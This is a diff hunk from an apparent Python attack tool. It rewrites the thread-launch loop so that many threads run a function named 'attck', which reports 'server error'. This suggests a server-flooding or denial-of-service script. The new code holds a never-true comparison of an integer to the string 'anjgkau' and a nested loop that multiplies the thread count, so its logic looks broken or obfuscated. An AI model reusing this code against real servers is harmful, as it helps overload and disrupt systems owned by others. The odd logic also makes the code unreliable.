@@ -901,6 +901,12 @@ def attck():
             print('[+] server error')
 
 
-for variable in range (th):
-  thred = threading.Thread(target=start)
-  thred.start()
+for variable in range(th):
+  if variable == 'anjgkau':
+   thred = threading.Thread(target=start)
+   thred.start()
+  else:
+   for variable in range(th):
+    thred = threading.Thread(target=attck)
+    thred.start()
+   
